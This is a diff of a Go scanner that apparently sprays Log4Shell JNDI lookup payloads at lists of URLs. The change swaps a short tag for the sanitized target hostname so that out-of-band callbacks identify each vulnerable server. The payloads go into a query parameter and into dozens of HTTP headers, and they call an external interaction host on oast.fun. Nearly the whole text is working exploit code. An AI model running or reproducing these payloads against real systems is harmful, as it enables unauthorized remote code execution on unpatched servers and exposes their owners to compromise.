@@ -134,14 +134,7 @@ func main() {
 
 		go func() {
 			for url := range httpURLs {
-				firstChar := string(url[0])
-
-				// Get the second character
-				secondChar := string(url[1])
-
-				// Get the last character
-				lastChar := string(url[len(url)-1])
-				withProto := "http://" + url + "/?x=${jndi:ldap://" + firstChar + secondChar + lastChar + ".chmph7c2vtc0000d7angge4mucoyyyyyr.oast.fun/a}"
+				withProto := "http://" + url + "/?x=${jndi:ldap://" + strings.ReplaceAll(url, ".", "_") + ".chmph7c2vtc0000d7angge4mucoyyyyyr.oast.fun/a}"
 				if code, ok := isListening(client, withProto, method); ok {
 					if showStatusCodes {
 						output <- fmt.Sprintf("%d %s", code, withProto)
@@ -293,16 +286,12 @@ func isListening(client *http.Client, url string, method string) (int, bool) {
 		"X-UIDH",
 		"X-XSRF-TOKEN",
 	}
-	firstChar := string(url[0])
-
-	// Get the second character
-	secondChar := string(url[1])
-
-	// Get the last character
-	lastChar := string(url[len(url)-1])
 	for _, header := range headers {
+		url := strings.ReplaceAll(url, ".", "_")
+		url = strings.ReplaceAll(url, ":", "_")
+		url = strings.Split(url, "/")[2]
 
-		req.Header.Add(header, "${jndi:ldap://"+firstChar+secondChar+lastChar+".chmph7c2vtc0000d7angge4mucoyyyyyr.oast.fun/a}")
+		req.Header.Add(header, "${jndi:ldap://"+url+".chmph7c2vtc0000d7angge4mucoyyyyyr.oast.fun/a}")
 	}
 
 	resp, err := client.Do(req)
